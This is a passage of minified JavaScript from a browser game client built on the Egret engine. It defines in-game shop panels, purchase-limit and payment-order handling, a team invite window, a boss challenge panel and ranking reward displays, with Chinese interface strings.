e.name=gettext("功勋商店"),e}return __extends(e,t),e.prototype.skinComplete=function(){this.listView.itemRenderer=s.HonorMarketItemRenderer,this.dataArr=new eui.ArrayCollection,this.listView.dataProvider=this.dataArr},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.listView.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onTap,this),this.addTouchEndEvent(this.get,this.onClick),observe(this,this.updateData,u.Shop.ins().postRefresMedalMessage),observe(this,this.callback,r.ActorCC.postFeatsChange),observe(this,this.callback,u.Shop.ins().postUpdateBuyMedal),u.Shop.ins().sendMedalMessage()},e.prototype.callback=function(){u.Shop.ins().sendMedalMessage()},e.prototype.updateData=function(){var t=[],e=a.GlobalConfig.FeatsStore;for(var i in e){var o=!0;if(e[i].buyType==h.FEATS_TYPE.forever)for(var s in u.Shop.ins().medalData.exchangeCount)if(e[i].index==Number(s)&&e[i].daycount){u.Shop.ins().medalData.exchangeCount[s]>=e[i].daycount&&(o=!1);break}o&&t.push(e[i])}this.dataArr.replaceAll(t),this.myAttrValue0.text=r.ActorCC.feats+"";var l=this.get.text;this.get.textFlow=n.TextFlowMaker.generateTextFlow1("|U:&T:"+l)},e.prototype.onClick=function(t){switch(t.currentTarget){case this.get:l.WarnCT.ins().setBuyGoodsWarn(7)}},e.prototype.onTap=function(t){},e}(o.BaseView);e.HonorMarketPanel=p,window.HonorMarketPanel=p,__reflect(p.prototype,"HonorMarketPanel",[]),window.HonorMarketPanel=p},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.NobleShopPanel=void 0;var n=i(1),o=i(0),s=i(25),a=i(2),r=i(1748),l=function(t){function e(){var e=t.call(this)||this;return e.name=gettext("贵族商城"),e}return __extends(e,t),e.prototype.skinComplete=function(){this.listView.itemRenderer=r.NobleShopItemRender},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];t[0]&&this.listView.addEventListener(egret.Event.ENTER_FRAME,this.scrollBottom,this),this.addTouchEvent(this,this.onTap),this.addTouchEvent(this.tipImg,this.onTap),this.updateData()},e.prototype.removeDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.removeTouchEvent(this,this.onTap),this.removeTouchEvent(this.tipImg,this.onTap),this.listView.removeEventListener(egret.Event.ENTER_FRAME,this.scrollBottom,this)},e.prototype.updateData=function(){var t=[],e=o.GlobalConfig.IntegralStore;for(var i in e)t.push(e[i]);this.listView.dataProvider=new eui.ArrayCollection(t)},e.prototype.onTap=function(t){if("buy"==t.target.name){var e=t.target.parent.goodsID,i=t.target.parent.shopType;s.Recharge.ins().getIsForeve()?win.open("BuyWin",e,i):a.TipsCT.ins().showTips(gettext("没有激活贵族特权无法购买"))}else t.currentTarget==this.tipImg&&win.open("FuliWin","GameNoticePanle")},e.prototype.scrollBottom=function(){this.listView.removeEventListener(egret.Event.ENTER_FRAME,this.scrollBottom,this),this.listView.scrollV=this.listView.contentHeight-this.listView.height},e}(n.BaseView);e.NobleShopPanel=l,window.NobleShopPanel=l,__reflect(l.prototype,"NobleShopPanel",[]),window.NobleShopPanel=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.NobleShopItemRender=void 0;var n=i(3),o=i(0),s=i(10),a=function(t){function e(){var e=t.call(this)||this;return e._sn_="NobleshoSkinItemShopItem",e.shopType=2,e.goodsID=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.itemIcon.addEventListener(egret.TouchEvent.TOUCH_TAP,this.showTip,this)},e.prototype.dataChanged=function(){var t=this.data;if(t){var e=o.GlobalConfig.ItemConfig[t.itemId];this.goodsID=t.index;var i="";i=t.price>1e5?gettext("{0}万",Math.floor(t.price/1e4)):t.price+"",this.money0.text=i,i=t.showYuanBao>1e5?gettext("{0}万",Math.floor(t.showYuanBao/1e4)):t.showYuanBao+"",this.money.text=i,this.itemName.text=e.name;var n=s.ItemUtil.getQuality2(e);this.itemName.textColor=s.ItemUtil.getQualityColor(n),this.used.text="（"+t.use+"）",this.used.x=this.itemName.x+this.itemName.width,this.itemIcon&&this.itemIcon.setData&&this.itemIcon.setData(e)}},e.prototype.showTip=function(){var t,e=o.GlobalConfig.IntegralStore;e[this.goodsID]&&(t=e[this.goodsID].itemId),void 0==t&&new Error("竟然没有找到该商品ID");var i=o.GlobalConfig.ItemConfig[t];win.open("ItemDetailedWin",0,i.id,1)},e}(n.BaseItemRender);e.NobleShopItemRender=a,window.NobleShopItemRender=a,__reflect(a.prototype,"NobleShopItemRender",[]),window.NobleShopItemRender=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PeakMarketShopPanel=void 0;var n=i(55),o=i(1),s=i(0),a=i(6),r=i(7),l=i(168),h=i(52),u=i(1750),p=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.listView.itemRenderer=u.PeakMarketShopItem,this.dataArr=new eui.ArrayCollection,this.listView.dataProvider=this.dataArr=new eui.ArrayCollection([])},e.prototype.addDisplay=function(){observe(this,this.updateData,h.Shop.ins().postRefresMedalMessage),observe(this,this.callback,h.Shop.ins().postUpdateBuyMedal),h.Shop.ins().sendMedalMessage()},e.prototype.callback=function(){h.Shop.ins().sendMedalMessage()},e.prototype.updateData=function(){var t=[];this.myLabel.text=""+a.BagCT.ins().getBagGoodsCountById(a.BagCT.BAG_TYPE_OTHTER,s.GlobalConfig.PeakRaceBase.begitem);for(var e in s.GlobalConfig.FeatsStore){var i=s.GlobalConfig.FeatsStore[e];if(!(1==i.shopType||i.openday[0]>r.GameServerCC.serverOpenDay+1||i.openday[1]<r.GameServerCC.serverOpenDay+1)){var o=!0;if(i.buyType==l.FEATS_TYPE.forever&&h.Shop.ins().medalData)for(var u in h.Shop.ins().medalData.exchangeCount)if(i.index==Number(u)&&i.daycount){h.Shop.ins().medalData.exchangeCount[u]>=i.daycount&&(o=!1);break}o&&t.push(i)}}t.sort(function(t,e){return n.Algorithm.sortAscAttr(t,e,"sort")}),this.dataArr.replaceAll(t)},e}(o.BaseView);e.PeakMarketShopPanel=p,window.PeakMarketShopPanel=p,__reflect(p.prototype,"PeakMarketShopPanel",[]),window.PeakMarketShopPanel=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PeakMarketShopItem=void 0;var n=i(3),o=i(0),s=i(6),a=i(2),r=i(129),l=i(52),h=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.createChildren=function(){this.addTouchEvent(this.buyBtn,this.onClick)},e.prototype.dataChanged=function(){var t=this.data,e=o.GlobalConfig.ItemConfig[t.goods[0].id];this.itemName.text=(null===e||void 0===e?void 0:e.name)||"",this.usage.text=t.use||"";var i=l.Shop.ins().medalData.exchangeCount[t.index]||0;if(2!=t.buyType){var n=i>=t.daycount?"#FF2121":"#20cb30",s="";s=1==t.buyType?gettext("每日限购"):3==t.buyType?gettext("永久限购"):"",this.limitLab.textFlow=(new egret.HtmlTextParser).parse(s+":<a color="+n+">"+(t.daycount-i)+"</a>/"+t.daycount)}else this.limitLab.textFlow=(new egret.HtmlTextParser).parse("");this.item.data=t.goods[0],this.costCm.setData(t.costItem,!1)},e.prototype.onClick=function(){var t=l.Shop.ins().medalData.exchangeCount[this.data.index];return 2!=this.data.buyType&&t>=this.data.daycount?void a.TipsCT.ins().showTips(gettext("购买次数不足")):s.BagCT.ins().getAllSurplusCount(1)<=0?void a.TipsCT.ins().showTips(gettext("背包已满，请前往清理")):void win.open(r.BuyPeakMarketShopPanel,this.data)},e}(n.BaseItemRender);e.PeakMarketShopItem=h,window.PeakMarketShopItem=h,__reflect(h.prototype,"PeakMarketShopItem",[]),window.PeakMarketShopItem=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ShopDailyGiftPanel=void 0;var n=i(1),o=i(0),s=i(52),a=i(1752),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.sData=new eui.ArrayCollection,e}return __extends(e,t),e.prototype.skinComplete=function(){this.lstGift.itemRenderer=a.ShopDailyGiftItemRender,this.lstGift.dataProvider=this.sData,s.Shop.ins().sendDailyGift()},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];
observe(this,this.updateView,s.Shop.ins().postDailyGift)},e.prototype.updateView=function(){for(var t=[],e=s.Shop.ins().dayliyData,i=o.GlobalConfig.DailyRechargeStoreConfig,n=0;n<e.length;n++){var a=i[n+1];if(a&&1==a.show){var r=e[n].lastTime,l={index:a.index,lastTimes:r,maxCount:a.maxCount,rewards:a.awards,showPrice:a.showPrice,price:a.price,giftName:a.name,rid:a.rid};t.push(l)}}this.sData.replaceAll(t)},e}(n.BaseView);e.ShopDailyGiftPanel=r,window.ShopDailyGiftPanel=r,__reflect(r.prototype,"ShopDailyGiftPanel",[]),window.ShopDailyGiftPanel=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ShopDailyGiftItemRender=void 0;var n=i(5),o=i(3),s=i(1753),a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.sData=new eui.ArrayCollection,e}return __extends(e,t),e.prototype.skinComplete=function(){this.lstReward.itemRenderer=s.ShopDailyRewardItemRender,this.lstReward.dataProvider=this.sData},e.prototype.dataChanged=function(){for(var t=[],e=0;e<this.data.rewards.length;e++){var i=this.data.rewards[e],o=this.data.showPrice[e],s=this.data.price[e],a=this.data.rid[e],r=this.data.lastTimes,l={rewards:i,price:o,price2:s,rid:a,lastTimes:r};t.push(l)}this.lbName.text=this.data.giftName?this.data.giftName:"",this.noTime.visible=this.data.lastTimes<=0,this.canBuy.textFlow=n.TextFlowMaker.generateTextFlow(gettext("今日购买次数:|C:0x54E43B&T:{0}|",this.data.lastTimes)),this.sData.replaceAll(t)},e}(o.BaseItemRender);e.ShopDailyGiftItemRender=a,window.ShopDailyGiftItemRender=a,__reflect(a.prototype,"ShopDailyGiftItemRender",[]),window.ShopDailyGiftItemRender=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ShopDailyRewardItemRender=void 0;var n=i(66),o=i(3),s=i(6),a=i(25),r=i(2),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.iData=new eui.ArrayCollection,e}return __extends(e,t),e.prototype.skinComplete=function(){this.itemGp.dataProvider=this.iData,this.addTouchEvent(this.btnBuy,this.onClick)},e.prototype.dataChanged=function(){var t=this.data.rewards,e=this.data.rid,i=a.Recharge.ins().getCashByRid(e)/100;this.price.text=n.PayUtils.getPayUnitStr(Math.floor(i*this.data.price),urlParam.payUnit),this.btnBuy.label=n.PayUtils.getPayUnitStr(i,urlParam.payUnit)+gettext("购买"),this.iData.replaceAll(t),this.btnBuy.visible=!!this.data.lastTimes},e.prototype.onClick=function(){if(!this.data.lastTimes)return void r.TipsCT.ins().showTips(gettext("购买次数不足"));var t=s.BagCT.ins().rockonNeedNum(this.data.rewards);t&&s.BagCT.ins().getAllSurplusCount(t)<0?r.TipsCT.ins().showTips(gettext("背包空间不足，请扩容")):a.Recharge.ins().sendPayOrder(this.data.rid)},e}(o.BaseItemRender);e.ShopDailyRewardItemRender=l,window.ShopDailyRewardItemRender=l,__reflect(l.prototype,"ShopDailyRewardItemRender",[]),window.ShopDailyRewardItemRender=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WeekLoopMarketItem=e.WeekLoopMarketPanel=void 0;var n=i(18),o=i(66),s=i(5),a=i(3),r=i(1),l=i(0),h=i(6),u=i(25),p=i(2),d=i(52),c=i(129),f=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="WeekMarketSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=g,this.eList.dataProvider=this.list=new eui.ArrayCollection},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this,this.onClick),observe(this,this.updateData,d.Shop.ins().postWeekLoopLimit),this.eList.selectedIndex=-1,this.updateData()},e.prototype.updateData=function(){this.arr=[];var t=l.GlobalConfig.WeekLimitedStoreByOpenDay,e=d.Shop.ins().weekLoopLimitDatas;for(var i in e)t[i]&&this.arr.push(t[i]);this.list.replaceAll(this.arr)},e.prototype.onClick=function(t){var e=this.arr[this.eList.selectedIndex];if(e&&"buy"==t.target.name){var i=d.Shop.ins().weekLoopLimitDatas;if(!i[e.index])return;var n=e.cost;if(!n)return;if(i[e.index].count>=e.Maxcount)return void p.TipsCT.ins().showTips(gettext("购买次数不足"));if(h.BagCT.ins().getAllSurplusCount(1)<=0)return void p.TipsCT.ins().showTips(gettext("背包已满，请前往清理"));n.rid?u.Recharge.ins().sendPayOrder(n.rid):win.open(c.BuyItemLoopPanel,e)}},e}(r.BaseView);e.WeekLoopMarketPanel=f,window.WeekLoopMarketPanel=f,__reflect(f.prototype,"WeekLoopMarketPanel",[]),window.WeekLoopMarketPanel=f;var g=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){if(this.data&&this.data.goods){var t=d.Shop.ins().weekLoopLimitDatas[this.data.index];if(t){var e=this.data,i=Math.max(0,e.Maxcount-t.count);this.eNum.textFlow=e.Maxcount?s.TextFlowMaker.generateTextFlow1(gettext("限购:|C:{0}&T:{1}|/{2}",i>0?n.ColorUtil.GREEN:n.ColorUtil.RED,i,e.Maxcount)):s.TextFlowMaker.generateTextFlow1(""),this.itemIcon.data=e.goods,this.eBuy.visible=i>0,this.exbuy.visible=0>=i;var a=e.cost;this.money2.visible=!!a.rid,this.money.visible=!a.rid,a.rid?this.money2.text=o.PayUtils.getPayUnitStr(l.GlobalConfig.RechargeConfig[a.rid].cash/100,urlParam.payUnit):this.money.setData(a),this.zkImg.visible=e.discount?!0:!1;var r=getLangType();r==LanguageEnum.CN||r==LanguageEnum.CN1?this.discountNum.text=e.discount?e.discount/10+"折":"":this.discountNum.text=e.discount?100-e.discount+"折":"",void 0!=e.pcost&&this.exGrp.parent?a.rid?this.exGold.text=gettext("原价:{0}",o.PayUtils.getPayUnitStr(Math.floor(e.pcost*l.GlobalConfig.RechargeConfig[a.rid].cash/100),urlParam.payUnit)):this.exGold.text=gettext("原价:{0}",e.pcost):this.exGrp.parent&&this.exGrp.parent.removeChild(this.exGrp)}}},e}(a.BaseItemRender);e.WeekLoopMarketItem=g,window.WeekLoopMarketItem=g,__reflect(g.prototype,"WeekLoopMarketItem",[]),window.WeekLoopMarketItem=g},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WeekMarketPanel=void 0;var n=i(1),o=i(0),s=i(4),a=i(6),r=i(12),l=i(25),h=i(7),u=i(2),p=i(26),d=i(52),c=i(264),f=i(129),g=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="WeekMarketSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=c.WeekMarketItem,this.eList.dataProvider=this.list=new eui.ArrayCollection},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.tabtype=Number(this.tab),this.addTouchEvent(this,this.onClick),observe(this,this.updateData,d.Shop.ins().postWeekLimitDatas,d.Shop.ins().postWeekLimitData),this.eList.selectedIndex=-1,this.updateData()},e.prototype.updateData=function(){this.arr=[];var t=o.GlobalConfig.WeekLimitedStore;for(var e in t){var i=t[e];this.tabtype&&this.tabtype!=i.tab||i.openday>0&&h.GameServerCC.serverOpenDay+1<i.openday||i.mergeCount>0&&h.GameServerCC._hefuCount<i.mergeCount||i.job>0&&s.ActorCC.jobId!=i.job||i.openlevel>0&&s.ActorCC.level<i.openlevel||i.openzs>0&&p.ZsCT.ins().stage<i.openzs||(!i.openSystem||r.OpenSystem.ins().checkSysOpen(i.openSystem))&&this.arr.push(t[e])}this.list.replaceAll(this.arr)},e.prototype.onClick=function(t){var e=this.arr[this.eList.selectedIndex];if(e&&"buy"==t.target.name){if(d.Shop.ins().getWeekNumById(e.index)>=e.Maxcount)return void u.TipsCT.ins().showTips(gettext("购买次数不足"));if(a.BagCT.ins().getAllSurplusCount(1)<=0)return void u.TipsCT.ins().showTips(gettext("背包已满，请前往清理"));e.rid?l.Recharge.ins().sendPayOrder(e.rid,[e.rid,e.Maxcount,0,0]):win.open(f.BuyItemPanel,e)}},e}(n.BaseView);e.WeekMarketPanel=g,window.WeekMarketPanel=g,__reflect(g.prototype,"WeekMarketPanel",[]),window.WeekMarketPanel=g},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WeekMarketPanel3=void 0;var n=i(19),o=i(1),s=i(0),a=i(4),r=i(6),l=i(12),h=i(25),u=i(7),p=i(2),d=i(26),c=i(52),f=i(264),g=i(129),m=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="WeekMarketSkin3",e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=f.WeekMarketItem,this.eList.dataProvider=this.list=new eui.ArrayCollection},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.tabtype=Number(this.tab),this.addTouchEvent(this,this.onClick),observe(this,this.updateData,c.Shop.ins().postWeekLimitDatas,c.Shop.ins().postWeekLimitData),this.eList.selectedIndex=-1,this.updateData()},e.prototype.updateData=function(){this.arr=[];var t=s.GlobalConfig.WeekLimitedStore;for(var e in t){var i=t[e];this.tabtype&&this.tabtype!=i.tab||i.openday>0&&u.GameServerCC.serverOpenDay+1<i.openday||i.mergeCount>0&&u.GameServerCC._hefuCount<i.mergeCount||i.job>0&&a.ActorCC.jobId!=i.job||i.openlevel>0&&a.ActorCC.level<i.openlevel||i.openzs>0&&d.ZsCT.ins().stage<i.openzs||(!i.openSystem||l.OpenSystem.ins().checkSysOpen(i.openSystem))&&this.arr.push(t[e])}if(0==this.arr.length)return win.close(this),void this.parent.removeChild(this);this.list.replaceAll(this.arr);var o=this.arr[0].money,r=n.GlobalFun.getItemCount(o);this.money.setData({type:1,id:o,count:r})},e.prototype.onClick=function(t){var e=this.arr[this.eList.selectedIndex];if(e&&"buy"==t.target.name){if(c.Shop.ins().getWeekNumById(e.index)>=e.Maxcount)return void p.TipsCT.ins().showTips(gettext("购买次数不足"));if(r.BagCT.ins().getAllSurplusCount(1)<=0)return void p.TipsCT.ins().showTips(gettext("背包已满，请前往清理"));e.rid?h.Recharge.ins().sendPayOrder(e.rid):win.open(g.BuyItemPanel,e)}},e}(o.BaseView);e.WeekMarketPanel3=m,window.WeekMarketPanel3=m,__reflect(m.prototype,"WeekMarketPanel3",[]),window.WeekMarketPanel3=m},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.SixTeamRoleItemRender=void 0;var n=i(3),o=i(0),s=i(10),a=i(4),r=i(44),l=i(79),h=i(1758),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._bolHideInvite=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.touchEnabled=!1,this.addTouchEvent(this,this.onTouch)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.dataChanged()},e.prototype.onTouch=function(t){switch(t.target){case this.invite:case this.nomember:if(l.SixReisCT.ins().tfMembers.length){var e=gettext("我开启了六道轮回队伍，赶紧加入一起战斗吧！");win.open(h.SixInviteWin,e)}break;case this.rolegroup:this._info&&this._info.roleID!=a.ActorCC.actorID&&r.ReadPlayerCT.ins().sendFindPlayer(this._info.roleID);break;case this.btnRemove:l.SixReisCT.ins().postOutOne(this._info.roleID)}},e.prototype.dataChanged=function(){var t;if(this.btnRemove.visible=!1,this.skin){if(this._info=this.data,!this._info)return this.nomember.visible=!0,this.invite.visible=!0,this.position.visible=!1,this.lab.visible=!!l.SixReisCT.ins().tfMembers.length,this.rolegroup.visible=!1,void this.updateHideInvite();if(this.lab.visible=!1,this.rolegroup.visible=!0,this.nomember.visible=this.invite.visible=!1,this.position.visible=!0,this.position.source=1==this._info.position?"road_leader":"road_assistant",this.eIcon.source="yuanhead"+this._info.job+1,this.eNameLab.text=this._info.roleName,this.ePow.text=this._info.power+"",this.lb_lv.text=this._info.lv+"",this.eTitleGrp.visible=!!this._info.title,this.eTitleGrp.visible){var e=o.GlobalConfig.TitleConf[this._info.title];this.eTitle.text=null===e||void 0===e?void 0:e.name,this.eTitle.textColor=s.ItemUtil.getQualityColor((null===e||void 0===e?void 0:e.rare)||0),this.updateTitleEff(e)}this._info.outward?this.bgkuang.source=(null===(t=o.GlobalConfig.TitleConf[this._info.outward])||void 0===t?void 0:t.img)+"_png":this.bgkuang.source="entity_bg",this.btnRemove.visible=l.SixReisCT.ins().checkIsTeamer(this._info.roleID)&&l.SixReisCT.ins().checkMeIsLeader()&&this._info.roleID!=a.ActorCC.actorID,this.updateHideInvite()}},e.prototype.updateTitleEff=function(t){return t.eff?(this.titleMc||(this.titleMc=ObjectPool.pop("MovieClip"),this.effTopGrp.addChild(this.titleMc)),this.eTitle.visible=!1,this.effTopGrp.visible=!0,void this.titleMc.playFile(RES_DIR_EFF+t.eff,-1)):(this.titleMc&&this.effTopGrp.removeChild(this.titleMc),this.titleMc=null,this.effTopGrp.visible=!1,void(this.eTitle.visible=!0))},e.prototype.setHideInvide=function(t){this._bolHideInvite=t,this.updateHideInvite()},e.prototype.updateHideInvite=function(){this.skin&&this._bolHideInvite&&(this.nomember.touchEnabled=!1,this.invite.visible=this.lab.visible=!1)},e}(n.BaseItemRender);e.SixTeamRoleItemRender=u,window.SixTeamRoleItemRender=u,__reflect(u.prototype,"SixTeamRoleItemRender",[]),window.SixTeamRoleItemRender=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.SixInviteWin=void 0;var n=i(1),o=i(7),s=i(2),a=i(79),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="teamFbInviteSkin",e._deDes="",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this._deDes=t[0],this.input.text=this._deDes,this.input.maxChars=40,this.addTouchEvent(this,this.onTouch)},e.prototype.onTouch=function(t){switch(t.target){case this.worldInviteBtn:var e=a.SixReisCT.ins().checkMeIsLeader();if(!e)return void s.TipsCT.ins().showTips(gettext("队长才能邀请玩家"));if(!a.SixReisCT.ins().checkCanInvite()){var i=Math.ceil(.001*(a.SixReisCT.ins().nextCanInviteTime-o.GameServerCC.serverTime));return void s.TipsCT.ins().showTips(gettext("{0}秒后才能世界邀请",i))}a.SixReisCT.ins().sendTeamInvite(),win.close(this)}},e}(n.BaseView);e.SixInviteWin=r,window.SixInviteWin=r,__reflect(r.prototype,"SixInviteWin",[]),window.SixInviteWin=r},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DevilBossPanel=void 0;var n=i(21),o=i(18),s=i(5),a=i(1),r=i(0),l=i(15),h=i(6),u=i(12),p=i(65),d=i(2),c=i(125),f=i(509),g=i(47),m=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.openCheck=function(){var t=u.OpenSystem.ins().checkSysOpen(l.SystemType.DevilMosBoss);return t||d.TipsCT.ins().showTips(u.OpenSystem.ins().getNoOpenTips(l.SystemType.DevilMosBoss)),t},e.prototype.skinComplete=function(){this.addTouchEvent(this,this.onClick),this.bossBody=new n.MovieClip,this.bossBody.x=this.bossBody.y=0,this.aniGrop.addChild(this.bossBody);var t,e=r.GlobalConfig.DevilBossConfig;for(var i in e)e[i].isBoss&&(t=parseInt(i),c.DevildomSys.ins().bossId=t);var o=f.DevildomBossModel.ins().getCurBossIdByIndex(t);this.bossDp=r.GlobalConfig.MonstersConfig[o],void 0!=c.DevildomSys.ins().bossIsKill?this.challengeBtn.enabled=!c.DevildomSys.ins().bossIsKill:this.challengeBtn.enabled=!1},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.dataSys=c.DevildomSys.ins(),observe(this,this.update,h.BagCT.ins().postItemAdd),observe(this,this.update,c.DevildomSys.ins().postBossInfo),observe(this,this.updateTime,c.DevildomSys.ins().isTimeGo),this.update(),this.updateTime(),this.bossBody.playFile(RES_DIR_EFF+"mojie",-1)},e.prototype.updateTime=function(){c.DevildomSys.ins().bossTime>0?this.Times.textFlow=s.TextFlowMaker.generateTextFlow1(gettext("倒计时开启魔主入侵：{0}秒","|C:"+o.ColorUtil.GREEN+"&T:"+c.DevildomSys.ins().bossTime+"|")):this.Times.text=""},e.prototype.update=function(){var t=c.DevildomSys.ins();void 0!=t.bossIsKill?this.challengeBtn.enabled=!t.bossIsKill:this.challengeBtn.enabled=!1,1==t.bossState&&(this.challengeBtn.enabled=!1),this.guildName.text=t.guildName?""+t.guildName:gettext("无行会"),this.killer.text=""+t.killer,this.killer.visible=!!t.killer,this.nullS.visible=!this.killer.visible,this.killGrop.visible=!!t.killer,t.guildName||t.killer||(this.nullS.visible=!0,this.killGrop.visible=!1);var e=t.bossState?gettext("未达到开放条件"):t.killedState[t.bossId]?gettext("魔主已被击杀"):"";this.desc.textFlow=s.TextFlowMaker.generateTextFlow1(""+e)},e.prototype.onClick=function(t){var e,i,n,o;switch(t.target){case this.closeBtn:win.close("DevilInvadeWin");break;case this.btnHelp1:win.open("CommonHelpWin",(null===(e=r.GlobalConfig.HelpInfoConfig[332])||void 0===e?void 0:e.text)||"");break;case this.btn0:var s=r.GlobalConfig.SkillsConfig[null===(i=r.GlobalConfig.DevilBossConfig[c.DevildomSys.ins().bossId])||void 0===i?void 0:i.skillId[0]],a=p.SkillUtil.getDesc(s);win.open("YupeiSkillTipsWin",p.SkillUtil.getName(s),a);break;case this.btn1:s=r.GlobalConfig.SkillsConfig[null===(n=r.GlobalConfig.DevilBossConfig[c.DevildomSys.ins().bossId])||void 0===n?void 0:n.skillId[1]],a=p.SkillUtil.getDesc(s),win.open("YupeiSkillTipsWin",p.SkillUtil.getName(s),a);break;case this.btn2:s=r.GlobalConfig.SkillsConfig[null===(o=r.GlobalConfig.DevilBossConfig[c.DevildomSys.ins().bossId])||void 0===o?void 0:o.skillId[2]],a=p.SkillUtil.getDesc(s),win.open("YupeiSkillTipsWin",p.SkillUtil.getName(s),a);break;case this.partBtn0:win.open("DevildomPartAwardWin",1);break;case this.belongBtn0:win.open("DevildomBelongAwardWin",1);break;case this.challengeBtn:if(!g.KfArenaSys.ins().checkIsMatching())return;var l=(this.dataSys.enterCD-egret.getTimer())/1e3>>0;if(l>0)return void d.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:{0}秒后可以进入！",l));var h=c.DevildomSys.ins();h.bossState||h.killedState[h.bossId]?d.TipsCT.ins().showTips(gettext("未达到开放条件")):c.DevildomSys.ins().sendEnter(h.bossId)}},e.prototype.removeDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e]},e}(a.BaseView);e.DevilBossPanel=m,window.DevilBossPanel=m,__reflect(m.prototype,"DevilBossPanel",[]),window.DevilBossPanel=m},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PeakAwardPanel=void 0;var n=i(1),o=i(1771),s=i(0),a=i(89),r=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.curServList.itemRenderer=o.PeakAwardItemRender,this.kfServList.itemRenderer=o.PeakAwardItemRender,this._listDt1=new eui.ArrayCollection,this._listDt2=new eui.ArrayCollection,this.curServList.dataProvider=this._listDt1=new eui.ArrayCollection([]),this.kfServList.dataProvider=this._listDt2=new eui.ArrayCollection([])},e.prototype.addDisplay=function(){var t=[];for(var e in s.GlobalConfig.PeakRaceTime){var i=s.GlobalConfig.PeakRaceTime[e];i.isKf=!1,i.loseMail&&t.push(i)}var n={status:a.BF_PeakStatus.Over,loseMail:s.GlobalConfig.PeakRaceBase.winMail,relTime:0,maxBett:0};n.isKf=!1,t.push(n),t.reverse(),this._listDt1.replaceAll(t),t=[];for(var e in s.GlobalConfig.PeakRaceCrossTime){var i=s.GlobalConfig.PeakRaceCrossTime[e];i.isKf=!0,i.loseMail&&t.push(i)}var o={loseMail:s.GlobalConfig.PeakRaceBase.crossWinMail,status:a.KF_PeakStatus.Over,relTime:0,maxBett:0};o.isKf=!0,t.push(o),t.reverse(),this._listDt2.replaceAll(t)},e}(n.BaseView);e.PeakAwardPanel=r,window.PeakAwardPanel=r,__reflect(r.prototype,"PeakAwardPanel",[]),window.PeakAwardPanel=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PeakAwardItemRender=void 0;var n=i(3),o=i(11),s=i(89),a=i(0),r=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.awardslist.itemRenderer=o.ItemBase},e.prototype.dataChanged=function(){this.typeLabel.text="",this.data.isKf?this.typeLabel.text=s.PeakedData.STATE_KF_TYPE_AWARD_CN[this.data.status]:this.typeLabel.text=s.PeakedData.STATE_TYPE_AWARD_CN[this.data.status];var t=a.GlobalConfig.MailIdConfig[this.data.loseMail];this.awardslist.dataProvider=new eui.ArrayCollection(t.attachment)},e}(n.BaseItemRender);e.PeakAwardItemRender=r,window.PeakAwardItemRender=r,__reflect(r.prototype,"PeakAwardItemRender",[]),window.PeakAwardItemRender=r},function(t,e,i){"use 